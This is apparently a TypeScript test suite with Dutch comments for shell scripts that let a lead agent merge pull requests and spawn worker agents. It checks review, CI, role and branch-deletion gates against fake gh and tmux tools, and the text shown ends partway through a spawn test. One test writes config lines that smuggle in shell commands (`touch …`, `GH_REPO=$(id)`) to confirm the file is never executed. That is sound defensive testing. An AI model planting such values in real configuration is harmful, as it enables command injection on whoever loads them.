import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { appendFileSync, chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { deflateSync } from "node:zlib";
import { dirname, join } from "node:path";

// Alle tests draaien de scripts met een nep-gh en nep-tmux vooraan op PATH, in een
// wegwerpmap met een eigen git-repo en lokale bare "origin". Geen echte tmux, geen echte PR's.

import { identiteitEnv } from "./hooks/codex-wrap";
import { GELIJK_AAN_REPO } from "./hooks/codex-controle";
import { commando } from "./hooks/codex-installeer";

const SPAWN = join(import.meta.dir, "spawn.sh");
const MERGE = join(import.meta.dir, "merge.sh");

let dir: string;
let bin: string;
let repo: string;
let origin: string;

const schrijfBin = (naam: string, tekst: string) => {
  const pad = join(bin, naam);
  writeFileSync(pad, tekst);
  chmodSync(pad, 0o755);
};

// Draait de test in een git-hook (pre-push), dan staan GIT_DIR e.d. in de omgeving en zouden
// de git-aanroepen hieronder de echte repo raken. Daarom: alle GIT_*-variabelen eruit.
const schoon = (): Record<string, string> => {
  const e: Record<string, string> = {};
  for (const [k, v] of Object.entries(process.env)) if (v !== undefined && !k.startsWith("GIT_")) e[k] = v;
  return { ...e, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_SYSTEM: "/dev/null" };
};

const git = (cwd: string, ...args: string[]) => Bun.spawnSync(["git", ...args], { cwd, env: schoon() });

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), "lead-test-"));
  bin = join(dir, "bin");
  repo = join(dir, "repo");
  origin = join(dir, "origin.git");
  mkdirSync(bin);
  mkdirSync(repo);

  // nep-gh: pr view geeft pr.json; pr merge logt en zet (optioneel) de staat op MERGED.
  schrijfBin(
    "gh",
    `#!/usr/bin/env bash
echo "gh $*" >> "$FAKE_DIR/gh.log"
if [ "$1 $2" = "pr view" ]; then
  [ -f "$FAKE_DIR/gh-faalt" ] && exit 1
  cat "$FAKE_DIR/pr.json"; exit 0
fi
if [ "$1 $2" = "pr list" ]; then
  [ -f "$FAKE_DIR/lijst-faalt" ] && { echo "nep: list mislukt" >&2; exit 1; }
  cat "$FAKE_DIR/base-lijst.json" 2>/dev/null || echo "[]"; exit 0
fi
if [ "$1 $2" = "pr edit" ]; then
  # edit-faalt leeg: elke edit faalt; met een PR-nummer erin: alleen die
  [ -f "$FAKE_DIR/edit-faalt" ] && { [ ! -s "$FAKE_DIR/edit-faalt" ] || [ "$(cat "$FAKE_DIR/edit-faalt")" = "$3" ]; } && { echo "nep: edit mislukt" >&2; exit 1; }
  git --git-dir "$FAKE_DIR/origin.git" for-each-ref --format="$3 %(refname)" refs/heads >> "$FAKE_DIR/edit-zag.txt"; exit 0
fi
if [ "$1 $2" = "pr merge" ]; then
  [ -f "$FAKE_DIR/merge-werkt" ] && sed -i.bak 's/"state":"OPEN"/"state":"MERGED"/' "$FAKE_DIR/pr.json"
  exit 0
fi
# api [-H Accept: …diff] repos/<o>/<r>/compare/<a>...<b> [--jq <expr>]: rekent met de lokale bare origin
if [ "$1" = api ] && [[ "$*" == *"/compare/"* ]]; then
  [ -f "$FAKE_DIR/compare-faalt" ] && { echo "nep: compare mislukt" >&2; exit 1; }
  shift; alsdiff=0
  if [ "$1" = -H ]; then alsdiff=1; shift 2; fi
  r=\${1#repos/*/*/compare/}; a=\${r%%...*}; b=\${r#*...}
  G=(git --git-dir "$FAKE_DIR/origin.git")
  mb=$("\${G[@]}" merge-base "$a" "$b") || exit 1
  if [ $alsdiff = 1 ]; then "\${G[@]}" diff "$mb" "$b"; exit $?; fi
  ra=$("\${G[@]}" rev-parse "$a^{commit}"); rb=$("\${G[@]}" rev-parse "$b^{commit}")
  if [ "$ra" = "$rb" ]; then st=identical; elif [ "$mb" = "$ra" ]; then st=ahead; elif [ "$mb" = "$rb" ]; then st=behind; else st=diverged; fi
  printf '{"status":"%s","merge_base_commit":{"sha":"%s"}}' "$st" "$mb" | jq -r "$3"; exit $?
fi
# api -X DELETE repos/<o>/<r>/git/refs/heads/<tak>: verwijder de tak uit de lokale bare origin
if [ "$1 $2 $3" = "api -X DELETE" ]; then
  git --git-dir "$FAKE_DIR/origin.git" update-ref -d "refs/heads/\${4#repos/*/*/git/refs/heads/}"; exit $?
fi
echo "nep-gh: onverwacht commando $*" >&2; exit 2
`,
  );

  // nep-tmux: log elke aanroep; capture-pane toont het bestand pane.txt;
  // send-keys ... Enter laat (als reageert) een tool-aanroep verschijnen.
  schrijfBin(
    "tmux",
    `#!/usr/bin/env bash
if [ "$1" = list-panes ]; then cat "$FAKE_DIR/panes.txt" 2>/dev/null; exit 0; fi
echo "tmux $*" >> "$FAKE_DIR/tmux.log"
case $1 in
  capture-pane) cat "$FAKE_DIR/pane.txt" 2>/dev/null; exit 0 ;;
  send-keys)
    if [ "\${*: -1}" = "Enter" ] && [ -f "$FAKE_DIR/reageert" ]; then echo "⏺ Read(opdracht.md)" >> "$FAKE_DIR/pane.txt"; fi
    exit 0 ;;
esac
exit 0
`,
  );

  // nep-agent-spawn: print een pane-id.
  schrijfBin("nep-agent-spawn.sh", `#!/usr/bin/env bash\necho "spawn $*" >> "$FAKE_DIR/spawn.log"\necho "bijvangst"\necho "%7"\n`);

  git(dir, "init", "-q", "--bare", "-b", "main", origin); // CI kent geen init.defaultBranch: anders wijst HEAD van origin naar master
  git(repo, "init", "-q", "-b", "main");
  // vangnet: nooit verdergaan als dit niet de wegwerp-repo is
  expect(git(repo, "rev-parse", "--git-dir").stdout.toString().trim()).toBe(".git");
  git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "begin");
  git(repo, "remote", "add", "origin", origin);
  git(repo, "push", "-q", "origin", "main");
  git(repo, "push", "-q", "origin", "main:lead/test-tak");

  // Standaard heeft de nep-head van pr() een groene e2e-stempel (modus alles); de stempeltests
  // maken hun eigen commits en stempels.
  mkdirSync(join(dir, "stempels"));
  stempel("abc1234def5678abc1234def5678abc1234def56", { modus: "alles", base: null });
});

const stempel = (sha: string, o: Record<string, unknown> = {}) =>
  writeFileSync(join(dir, "stempels", `${sha}.json`), `${JSON.stringify({ sha, groen: true, modus: "affected", tijd: "2026-10-21T18:00:00.000Z", ...o })}\n`);

afterEach(() => rmSync(dir, { recursive: true, force: true }));

const omgeving = (extra: Record<string, string> = {}) => ({
  ...schoon(),
  PATH: `${bin}:${process.env.PATH}`,
  FAKE_DIR: dir,
  LAB_LEAD_STAAT: join(dir, "staat"),
  LAB_SPAWN_REPO: repo, // wegwerp-repo: spawn.sh toetst nooit de echte checkout (en haalt niets van het netwerk)
  LAB_MERGE_STEMPELS: join(dir, "stempels"),
  TMUX: "",
  TMUX_PANE: "",
  ...extra,
});

const draai = (script: string, args: string[], extra: Record<string, string> = {}, cwd = repo) => {
  // merge.sh merget alleen als lead; de rol-tests zetten LAB_AGENT_ROL zelf via extra.
  const r = Bun.spawnSync([...(script.endsWith("merge.sh") ? ["/bin/bash", "-p"] : ["bash"]), script, ...args], { cwd, env: omgeving(script === MERGE ? { LAB_AGENT_ROL: "lead", ...extra } : extra) });
  return { code: r.exitCode, uit: r.stdout.toString(), fout: r.stderr.toString() };
};

const log = (naam: string) => (existsSync(join(dir, naam)) ? readFileSync(join(dir, naam), "utf8") : "");
const remoteTakken = () => git(repo, "ls-remote", "--heads", "origin").stdout.toString();

// Echte vorm uit #89 (gh pr view 89 --json statusCheckRollup): Vercel zet eigen entries naast die van Actions.
const VERCEL = [
  { __typename: "StatusContext", context: "Vercel", startedAt: "2026-10-06T17:26:07Z", state: "SUCCESS", targetUrl: "https://vercel.com/x" },
  { __typename: "CheckRun", name: "Vercel Preview Comments", status: "COMPLETED", conclusion: "SUCCESS", startedAt: "2026-10-06T17:26:08Z", completedAt: "2026-10-06T17:26:08Z", workflowName: "" },
];

describe("merge.sh", () => {
  const pr = (o: Record<string, unknown> = {}) =>
    writeFileSync(
      join(dir, "pr.json"),
      JSON.stringify({
        state: "OPEN",
        headRefName: "lead/test-tak",
        headRefOid: "abc1234def5678abc1234def5678abc1234def56",
        isCrossRepository: false,
        mergeable: "MERGEABLE",
        mergeStateStatus: "CLEAN",
        comments: [{ body: "Lead-review: akkoord abc1234, ziet er goed uit" }],
        statusCheckRollup: [{ __typename: "CheckRun", workflowName: "CI", name: "poort", conclusion: "SUCCESS", status: "COMPLETED" }],
        ...o,
      }),
    );
  const geweigerd = (r: { code: number; fout: string }, reden: RegExp) => {
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(reden);
    expect(log("gh.log")).not.toContain("pr merge");
    expect(remoteTakken()).toContain("lead/test-tak");
  };

  test("weigert zonder nummer of met een vreemd nummer", () => {
    pr();
    expect(draai(MERGE, []).code).toBe(1);
    expect(draai(MERGE, ["abc"]).fout).toMatch(/PR-nummer/);
  });

  test("weigert zonder Lead-review-comment", () => {
    pr({ comments: [{ body: "ziet er goed uit" }, { body: "ik: Lead-review: akkoord (niet aan het begin)" }] });
    geweigerd(draai(MERGE, ["71"]), /Lead-review: akkoord/);
  });

  test("weigert een akkoord voor een oudere head (push na akkoord)", () => {
    pr({ comments: [{ body: "Lead-review: akkoord 1111111" }, { body: "Lead-review: akkoord" }] });
    geweigerd(draai(MERGE, ["71"]), /push na akkoord/);
  });

  test("weigert een fork-PR en de tak main", () => {
    pr({ isCrossRepository: true });
    geweigerd(draai(MERGE, ["71"]), /fork/);
    pr({ headRefName: "main" });
    expect(draai(MERGE, ["71"]).fout).toMatch(/tak 'main'/);
    expect(log("gh.log")).not.toContain("pr merge");
  });

  test("mergeStateStatus is een allowlist: HAS_HOOKS en BLOCKED worden geweigerd", () => {
    pr({ mergeStateStatus: "HAS_HOOKS" });
    geweigerd(draai(MERGE, ["71"]), /mergeStateStatus: HAS_HOOKS/);
    pr({ mergeStateStatus: "BLOCKED" });
    expect(draai(MERGE, ["71"]).code).toBe(1);
  });

  test("UNSTABLE merget met een waarschuwing", () => {
    pr({ mergeStateStatus: "UNSTABLE" });
    writeFileSync(join(dir, "merge-werkt"), "");
    const r = draai(MERGE, ["71"]);
    expect(r.code).toBe(0);
    expect(r.fout).toMatch(/waarschuwing/);
  });

  test("telt de nieuwste run van poort, niet de laatste in de array", () => {
    pr({
      statusCheckRollup: [
        { __typename: "CheckRun", workflowName: "CI", name: "poort", conclusion: "FAILURE", startedAt: "2026-10-06T10:00:00Z" },
        { __typename: "CheckRun", workflowName: "CI", name: "poort", conclusion: "SUCCESS", startedAt: "2026-10-06T11:00:00Z" },
        { __typename: "CheckRun", workflowName: "CI", name: "poort", conclusion: "FAILURE", startedAt: "2026-10-06T09:00:00Z" },
      ],
    });
    expect(draai(MERGE, ["71", "--droog"]).code).toBe(0);
    pr({
      statusCheckRollup: [
        { __typename: "CheckRun", workflowName: "CI", name: "poort", conclusion: "SUCCESS", startedAt: "2026-10-06T09:00:00Z" },
        { __typename: "CheckRun", workflowName: "CI", name: "poort", conclusion: "FAILURE", startedAt: "2026-10-06T11:00:00Z" },
        { __typename: "CheckRun", workflowName: "CI", name: "poort", conclusion: "SUCCESS", startedAt: "2026-10-06T08:00:00Z" },
      ],
    });
    expect(draai(MERGE, ["71", "--droog"]).fout).toMatch(/niet groen/);
  });

  test("weigert als de check poort niet groen is", () => {
    pr({ statusCheckRollup: [{ __typename: "CheckRun", workflowName: "CI", name: "poort", conclusion: "FAILURE" }] });
    geweigerd(draai(MERGE, ["71"]), /niet groen/);
  });

  test("weigert met een eigen melding als er geen enkele check-run is", () => {
    pr({ statusCheckRollup: [] });
    const r = draai(MERGE, ["71"]);
    geweigerd(r, /geen CI-run voor abc1234; sluit en heropen de PR of push opnieuw/);
    expect(r.fout).not.toMatch(/niet groen|staat niet/);
  });

  test("alleen de twee Vercel-entries in de rollup is ook geen CI-run", () => {
    pr({ statusCheckRollup: VERCEL });
    const r = draai(MERGE, ["71"]);
    geweigerd(r, /geen CI-run voor abc1234; sluit en heropen de PR of push opnieuw/);
    expect(r.fout).not.toMatch(/niet groen|staat niet/);
  });

  test("alleen een bezige CI-CheckRun (melding) is wel een CI-run: dan 'poort ontbreekt'", () => {
    pr({ statusCheckRollup: [{ __typename: "CheckRun", workflowName: "CI", name: "melding", status: "IN_PROGRESS", conclusion: "" }, ...VERCEL] });
    const r = draai(MERGE, ["71"]);
    geweigerd(r, /'poort' staat niet/);
    expect(r.fout).not.toMatch(/geen CI-run/);
  });

  test("weigert als de check poort ontbreekt (een andere check groen telt niet)", () => {
    pr({ statusCheckRollup: [{ __typename: "CheckRun", workflowName: "CI", name: "lint", conclusion: "SUCCESS" }] });
    geweigerd(draai(MERGE, ["71"]), /'poort' staat niet/);
  });

  test("weigert als de PR niet mergeable is", () => {
    pr({ mergeable: "CONFLICTING", mergeStateStatus: "DIRTY" });
    geweigerd(draai(MERGE, ["71"]), /niet mergeable/);
  });

  test("weigert als de tak achterloopt (strict)", () => {
    pr({ mergeStateStatus: "BEHIND" });
    geweigerd(draai(MERGE, ["71"]), /achter/);
  });

  test("weigert een PR die al gemerged is", () => {
    pr({ state: "MERGED" });
    geweigerd(draai(MERGE, ["71"]), /MERGED/);
  });

  test("weigert als gh de PR niet kan ophalen", () => {
    pr();
    writeFileSync(join(dir, "gh-faalt"), "");
    geweigerd(draai(MERGE, ["71"]), /niet op te halen/);
  });

  test("--droog merget niets", () => {
    pr();
    const r = draai(MERGE, ["71", "--droog"]);
    expect(r.code).toBe(0);
    expect(r.uit).toContain("droog");
    expect(log("gh.log")).not.toContain("pr merge");
    expect(remoteTakken()).toContain("lead/test-tak");
  });

  test("alleen de lead merget: zonder LAB_AGENT_ROL=lead geweigerd, --droog mag wel", () => {
    pr();
    writeFileSync(join(dir, "merge-werkt"), "");
    for (const rol of ["", "agent", "sublead", "vervolg", "Lead"]) {
      const r = draai(MERGE, ["71"], { LAB_AGENT_ROL: rol });
      expect(r.code).toBe(1);
      expect(r.fout).toContain("merge: geweigerd: alleen de lead merget (LAB_AGENT_ROL=lead)");
    }
    expect(log("gh.log")).toBe("");
    expect(draai(MERGE, ["71", "--droog"], { LAB_AGENT_ROL: "agent" }).code).toBe(0);
    expect(log("gh.log")).not.toContain("pr merge");
    expect(remoteTakken()).toContain("lead/test-tak");
  });

  test("lead.conf wordt niet ge-sourcet: alleen CI_WORKFLOW= en GH_REPO= worden gelezen", () => {
    pr();
    const kopie = join(dir, "kopie");
    mkdirSync(kopie);
    writeFileSync(join(kopie, "merge.sh"), readFileSync(MERGE, "utf8"));
    writeFileSync(join(kopie, "lead.conf"), `touch "${dir}/uitgevoerd"\nCI_WORKFLOW=CI\nGH_REPO=bbawuah/LAB-BAWUAH\nCHECK=nep\n`);
    const r = draai(join(kopie, "merge.sh"), ["71", "--droog"]);
    expect(r.code).toBe(0);
    expect(existsSync(join(dir, "uitgevoerd"))).toBe(false);
    writeFileSync(join(kopie, "lead.conf"), "CI_WORKFLOW=CI\nGH_REPO=$(id)\n");
    expect(draai(join(kopie, "merge.sh"), ["71", "--droog"]).fout).toMatch(/GH_REPO ontbreekt of is ongeldig/);
  });

  test("elke gh-aanroep gebruikt de vaste repo uit lead.conf", () => {
    pr();
    writeFileSync(join(dir, "merge-werkt"), "");
    expect(draai(MERGE, ["71"]).code).toBe(0);
    const regels = log("gh.log").trim().split("\n");
    expect(regels.length).toBeGreaterThan(1);
    for (const r of regels) {
      if (r.startsWith("gh api -X DELETE")) expect(r).toBe("gh api -X DELETE repos/bbawuah/LAB-BAWUAH/git/refs/heads/lead/test-tak --silent");
      else if (r.startsWith("gh api")) expect(r).toMatch(/^gh api (-H Accept: application\/vnd\.github\.diff )?repos\/bbawuah\/LAB-BAWUAH\/compare\//);
      else expect(r).toEndWith("--repo bbawuah/LAB-BAWUAH");
    }
    // de remote tak gaat weg via de API, niet via een lokale git push
    expect(regels.some((r) => r.startsWith("gh api -X DELETE"))).toBe(true);
  });

  test("als root-kopie: geen LAB_MERGE_CHECK/LAB_MERGE_CI_WORKFLOW uit de env (vanuit de repo wel)", () => {
    const bron = readFileSync(MERGE, "utf8");
    expect(bron.split("\n")[0]).toBe("#!/bin/bash -p");
    expect(bron).toContain('[ "$(cd "$(dirname "$0")" && pwd -P)" = /usr/local/lib/lab-lead ] && geinstalleerd=1');
    expect(bron).toMatch(/PATH=\/usr\/bin:\/bin:\/opt\/homebrew\/bin\n\s+export PATH\n\s+unset LAB_MERGE_CHECK LAB_MERGE_CI_WORKFLOW/);
    // vanuit de repo telt de override nog: een check die niet bestaat, weigert
    pr();
    expect(draai(MERGE, ["71", "--droog"], { LAB_MERGE_CHECK: "bestaat-niet" }).fout).toMatch(/'bestaat-niet' staat niet/);
  });

  describe("e2e-stempel", () => {
    const wie = ["-c", "user.name=t", "-c", "user.email=t@t"];
    const commit = (bericht: string, bestand?: [string, string]) => {
      if (bestand) {
        writeFileSync(join(repo, bestand[0]), bestand[1]);
        git(repo, "add", bestand[0]);
      }
      expect(git(repo, ...wie, "commit", "-q", "--allow-empty", "-m", bericht).exitCode).toBe(0);
      return git(repo, "rev-parse", "HEAD").stdout.toString().trim();
    };
    const push = (ref: string) => expect(git(repo, "push", "-q", "-f", "origin", ref).exitCode).toBe(0);
    // main met één bestand; de tak van de PR wijzigt een ander bestand
    const opzet = () => {
      const basis = commit("basis", ["a.txt", "a\n"]);
      push("main");
      git(repo, "checkout", "-q", "-b", "werk");
      const s1 = commit("pr: x", ["x.txt", "x1\n"]);
      return { basis, s1 };
    };
    const prOp = (head: string, commits: string[]) => {
      push(`${head}:refs/heads/lead/test-tak`);
      pr({ headRefOid: head, comments: [{ body: `Lead-review: akkoord ${head.slice(0, 7)}` }], commits: commits.map((oid) => ({ oid })) });
    };

    test("stempel op de head (affected, basis = main): akkoord; --droog noemt de stempel", () => {
      const { basis, s1 } = opzet();
      stempel(s1, { base: basis });
      prOp(s1, [s1]);
      const r = draai(MERGE, ["71", "--droog"]);
      expect(r.code).toBe(0);
      expect(r.uit).toContain(`e2e-stempel op de head ${s1.slice(0, 7)} (affected, 2026-10-21T18:00:00.000Z)`);
      expect(r.uit).toContain(`droog: PR 71 voldoet (e2e-stempel ${s1.slice(0, 7)})`);
      expect(log("gh.log")).not.toContain("pr merge");
    });

    test("stempel op een oudere commit met dezelfde patch: akkoord", () => {
      const { basis, s1 } = opzet();
      const s2 = commit("lege commit na de poort");
      stempel(s1, { base: basis });
      prOp(s2, [s1, s2]);
      const r = draai(MERGE, ["71", "--droog"]);
      expect(r.code).toBe(0);
      expect(r.uit).toContain(`e2e-stempel op ${s1.slice(0, 7)} (affected, 2026-10-21T18:00:00.000Z); patch van de head ${s2.slice(0, 7)} is gelijk`);
    });

    test("update-branch: main in de tak gemerged, stempel van vóór de merge: akkoord", () => {
      const { basis, s1 } = opzet();
      stempel(s1, { base: basis });
      git(repo, "checkout", "-q", "main");
      commit("main schuift door", ["b.txt", "b\n"]);
      push("main");
      git(repo, "checkout", "-q", "werk");
      expect(git(repo, ...wie, "merge", "-q", "--no-edit", "main").exitCode).toBe(0);
      const m = git(repo, "rev-parse", "HEAD").stdout.toString().trim();
      prOp(m, [s1, m]);
      const r = draai(MERGE, ["71", "--droog"]);
      expect(r.code).toBe(0);
      expect(r.uit).toContain(`e2e-stempel op ${s1.slice(0, 7)}`);
      expect(r.uit).toContain(`patch van de head ${m.slice(0, 7)} is gelijk`);
    });

    test("patch gewijzigd na de stempel: geweigerd", () => {
      const { basis, s1 } = opzet();
      const s2 = commit("pr: x verder", ["x.txt", "x2\n"]);
      stempel(s1, { base: basis });
      prOp(s2, [s1, s2]);
      geweigerd(draai(MERGE, ["71"]), new RegExp(`patch is gewijzigd na de stempel op ${s1.slice(0, 7)}`));
    });

    test("geen stempel: geweigerd, met de opdracht om de poort te draaien; ook --droog", () => {
      const { s1 } = opzet();
      prOp(s1, [s1]);
      geweigerd(draai(MERGE, ["71"]), /geen e2e-stempel voor PR 71: draai `bun run poort` \(met e2e\)/);
      expect(draai(MERGE, ["71", "--droog"]).code).toBe(1);
    });

    test("rode, onleesbare of oude stempel (zonder groen): geweigerd", () => {
      const { basis, s1 } = opzet();
      prOp(s1, [s1]);
      for (const o of [{ groen: false, base: basis }, { groen: undefined, base: basis }, { sha: "f".repeat(40), base: basis }, { base: null }, { modus: "half", base: basis }]) {
        stempel(s1, o);
        geweigerd(draai(MERGE, ["71"]), /is niet groen of onleesbaar/);
      }
      writeFileSync(join(dir, "stempels", `${s1}.json`), "{kapot");
      geweigerd(draai(MERGE, ["71"]), /is niet groen of onleesbaar/);
    });

    test("stempel met een basis die geen voorouder van main is (--base HEAD): geweigerd", () => {
      const { s1 } = opzet();
      stempel(s1, { base: s1 });
      prOp(s1, [s1]);
      geweigerd(draai(MERGE, ["71"]), /met een basis \(\w{7}\) die geen voorouder van main is/);
    });

    test("een symlink als stempel telt niet", () => {
      const { basis, s1 } = opzet();
      writeFileSync(join(dir, "elders.json"), JSON.stringify({ sha: s1, groen: true, modus: "affected", base: basis, tijd: "x" }));
      Bun.spawnSync(["ln", "-s", join(dir, "elders.json"), join(dir, "stempels", `${s1}.json`)]);
      prOp(s1, [s1]);
      geweigerd(draai(MERGE, ["71"]), /geen e2e-stempel voor PR 71/);
    });

    test("gh compare faalt: geweigerd (fail-closed)", () => {
      const { basis, s1 } = opzet();
      stempel(s1, { base: basis });
      prOp(s1, [s1]);
      writeFileSync(join(dir, "compare-faalt"), "");
      geweigerd(draai(MERGE, ["71"]), /kon main\.\.\.\w{7} niet vergelijken/);
    });

    test("met een geldige stempel merget hij echt", () => {
      const { basis, s1 } = opzet();
      stempel(s1, { base: basis });
      prOp(s1, [s1]);
      writeFileSync(join(dir, "merge-werkt"), "");
      expect(draai(MERGE, ["71"]).code).toBe(0);
      expect(log("gh.log")).toContain(`gh pr merge 71 --merge --match-head-commit ${s1}`);
    });
  });

  test("merget met --merge en verwijdert pas daarna de remote tak", () => {
    pr();
    writeFileSync(join(dir, "merge-werkt"), "");
    const r = draai(MERGE, ["71"]);
    expect(r.code).toBe(0);
    expect(log("gh.log")).toContain("gh pr merge 71 --merge");
    expect(remoteTakken()).not.toContain("lead/test-tak");
    expect(remoteTakken()).toContain("refs/heads/main");
  });

  test("zet open PR's met de gemergede tak als base eerst op main, pas daarna gaat de tak weg", () => {
    pr();
    writeFileSync(join(dir, "merge-werkt"), "");
    writeFileSync(join(dir, "base-lijst.json"), JSON.stringify([{ number: 245 }, { number: 247 }]));
    const r = draai(MERGE, ["71"]);
    expect(r.code).toBe(0);
    const regels = log("gh.log").trim().split("\n");
    expect(regels).toContain("gh pr list --base lead/test-tak --state open --limit 1000 --json number --repo bbawuah/LAB-BAWUAH");
    expect(regels).toContain("gh pr edit 245 --base main --repo bbawuah/LAB-BAWUAH");
    expect(regels).toContain("gh pr edit 247 --base main --repo bbawuah/LAB-BAWUAH");
    expect(regels.findIndex((l) => l.startsWith("gh pr edit"))).toBeLessThan(regels.findIndex((l) => l.startsWith("gh api -X DELETE")));
    // op het moment van de wijziging stond de tak er nog
    expect(log("edit-zag.txt")).toContain("refs/heads/lead/test-tak");
    expect(remoteTakken()).not.toContain("lead/test-tak");
  });

  test("verwijdert de tak niet als een afhankelijke PR niet naar main kan", () => {
    pr();
    writeFileSync(join(dir, "merge-werkt"), "");
    writeFileSync(join(dir, "base-lijst.json"), JSON.stringify([{ number: 245 }]));
    writeFileSync(join(dir, "edit-faalt"), "");
    const r = draai(MERGE, ["71"]);
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/PR 245 \(base lead\/test-tak\) kon niet naar main; al op main gezet: geen; remote tak lead\/test-tak blijft staan/);
    expect(log("gh.log")).not.toContain("gh api -X DELETE");
    expect(remoteTakken()).toContain("lead/test-tak");
  });

  test("een lijst van precies de limiet kan afgekapt zijn: tak blijft staan met melding", () => {
    pr();
    writeFileSync(join(dir, "merge-werkt"), "");
    writeFileSync(join(dir, "base-lijst.json"), JSON.stringify(Array.from({ length: 1000 }, (_, i) => ({ number: i + 1 }))));
    const r = draai(MERGE, ["71"]);
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/1000 PR's met base lead\/test-tak is de limiet.*remote tak lead\/test-tak blijft staan/);
    expect(log("gh.log")).not.toContain("gh pr edit");
    expect(log("gh.log")).not.toContain("gh api -X DELETE");
    expect(remoteTakken()).toContain("lead/test-tak");
  });

  test("tweede edit faalt: tak blijft en de melding noemt wat al op main staat", () => {
    pr();
    writeFileSync(join(dir, "merge-werkt"), "");
    writeFileSync(join(dir, "base-lijst.json"), JSON.stringify([{ number: 245 }, { number: 247 }]));
    writeFileSync(join(dir, "edit-faalt"), "247");
    const r = draai(MERGE, ["71"]);
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/PR 247 \(base lead\/test-tak\) kon niet naar main; al op main gezet: #245; remote tak/);
    expect(remoteTakken()).toContain("lead/test-tak");
  });

  test.each(["null", "5", "{}"])("antwoord %s is geen lijst: fail-closed, tak blijft staan", (antwoord) => {
    pr();
    writeFileSync(join(dir, "merge-werkt"), "");
    writeFileSync(join(dir, "base-lijst.json"), antwoord);
    const r = draai(MERGE, ["71"]);
    expect(r.code).not.toBe(0);
    expect(r.fout).toMatch(/geen lijst.*remote tak lead\/test-tak blijft staan/);
    expect(log("gh.log")).not.toContain("gh pr edit");
    expect(log("gh.log")).not.toContain("gh api -X DELETE");
    expect(remoteTakken()).toContain("lead/test-tak");
  });

  test("onleesbaar antwoord over de afhankelijke PR's: tak blijft staan", () => {
    pr();
    writeFileSync(join(dir, "merge-werkt"), "");
    writeFileSync(join(dir, "base-lijst.json"), "geen json");
    const r = draai(MERGE, ["71"]);
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/onleesbaar\)?; remote tak lead\/test-tak blijft staan/);
    expect(remoteTakken()).toContain("lead/test-tak");
  });

  test("verwijdert de tak niet als de lijst afhankelijke PR's niet op te halen is", () => {
    pr();
    writeFileSync(join(dir, "merge-werkt"), "");
    writeFileSync(join(dir, "lijst-faalt"), "");
    const r = draai(MERGE, ["71"]);
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/niet op te halen; remote tak lead\/test-tak blijft staan/);
    expect(remoteTakken()).toContain("lead/test-tak");
  });

  test("laat de remote tak staan als de PR na het mergen niet MERGED is", () => {
    pr(); // merge-werkt ontbreekt: de staat blijft OPEN
    const r = draai(MERGE, ["71"]);
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/niet MERGED/);
    expect(remoteTakken()).toContain("lead/test-tak");
  });
});

describe("spawn.sh", () => {
  const opdracht = () => {
    const p = join(dir, "opdracht.md");
    writeFileSync(p, "doe iets\n");
    return p;
  };
  const basis = (extra: Record<string, string> = {}) => ({
    LAB_SPAWN_SCRIPT: join(bin, "nep-agent-spawn.sh"),
    LAB_SPAWN_POLS: "0",
    LAB_SPAWN_WACHT: "0",
    LAB_SPAWN_BEWIJS: "0",
    LAB_LEAD_NAAM: "",
    LAB_CLAUDE_JSON: join(dir, "bestaat-niet.json"), // nooit de echte ~/.claude.json lezen
    ...extra,
  });

  test("weigert zonder bestaand opdrachtbestand", () => {
    const r = draai(SPAWN, ["--naam", "w1", "--opdracht", join(dir, "bestaat-niet.md"), "--lead", "lead-x"], basis());
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/opdrachtbestand bestaat niet/);
    expect(log("spawn.log")).toBe("");
  });

  test("weigert zonder naam, opdracht of lead, en bij een ongeldig model", () => {
    expect(draai(SPAWN, ["--opdracht", opdracht(), "--lead", "l"], basis()).fout).toMatch(/--naam/);
    expect(draai(SPAWN, ["--naam", "w1", "--lead", "l"], basis()).fout).toMatch(/--opdracht/);
    expect(draai(SPAWN, ["--naam", "w1", "--opdracht", opdracht()], basis()).fout).toMatch(/lead/);
    expect(draai(SPAWN, ["--naam", "w1", "--opdracht", opdracht(), "--lead", "l", "--model", "gpt"], basis()).fout).toMatch(/sonnet of opus/);
  });

  test("een optie zonder waarde geeft een duidelijke fout", () => {
    const r = draai(SPAWN, ["--opdracht", opdracht(), "--lead", "l", "--naam"], basis());
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/--naam heeft een waarde nodig/);
  });

  test("weigert een opdrachtpad met regeleinde of aanhalingsteken; quote een pad met spatie", () => {
    const r1 = draai(SPAWN, ["--naam", "w1", "--opdracht", "a\nb.md", "--lead", "l"], basis());
    expect(r1.fout).toMatch(/opdrachtpad/);
    const r2 = draai(SPAWN, ["--naam", "w1", "--opdracht", "it's.md", "--lead", "l"], basis());
    expect(r2.fout).toMatch(/opdrachtpad/);
    const spatie = join(dir, "met spatie.md");
    writeFileSync(spatie, "x");
    const r3 = draai(SPAWN, ["--naam", "w1", "--opdracht", spatie, "--lead", "l", "--droog"], basis());
    expect(r3.uit).toContain(`Lees '${spatie}' en`);
  });

  test("weigert niet-numerieke LAB_SPAWN_*-waarden", () => {
    const r = draai(SPAWN, ["--naam", "w1", "--opdracht", opdracht(), "--lead", "l", "--droog"], basis({ LAB_SPAWN_WACHT: "snel" }));
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/LAB_SPAWN_WACHT/);
  });

  test("de vertrouwensvraag die niet weggaat geeft na WACHT_VERTROUWEN een fout met pane en startzin, zonder toets", () => {
    writeFileSync(join(dir, "pane.txt"), "Quick safety check: Is this a project you created or one you trust?\n❯ No, exit\n  Yes, I trust this folder\n");
    const r = draai(SPAWN, ["--naam", "w1", "--opdracht", opdracht(), "--lead", "l", "--map", dir], basis({ LAB_SPAWN_POLS: "1", WACHT_VERTROUWEN: "1" }));
    expect(r.code).toBe(1);
    expect(r.fout).toContain("w1 wacht op vertrouwen in pane %7");
